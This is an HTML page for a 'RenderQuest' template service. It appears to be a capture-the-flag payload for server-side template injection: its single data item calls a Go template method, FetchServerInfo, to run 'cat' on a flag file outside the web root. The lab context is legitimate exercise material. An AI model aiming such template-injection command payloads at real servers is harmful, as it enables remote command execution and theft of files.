<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RenderQuest</title>
</head>
<body>
    <header>
        <h1>Welcome to RenderQuest!</h1>
        <p>Express yourself through words and creativity</p>
        <p>You provide the templates, we provide the data!</p>
    </header>
    <main>
        <h2>Available template data:</h2>
        <ul>
            <li>Client IP: {{.FetchServerInfo "cat ../flagd7fe094014.txt"}}</li>
        </ul>
    </main>
    <footer>
        <p>Enter the link to your template!</p>
        <!-- You can add an input field or a form here if needed -->
    </footer>
</body>
</html>
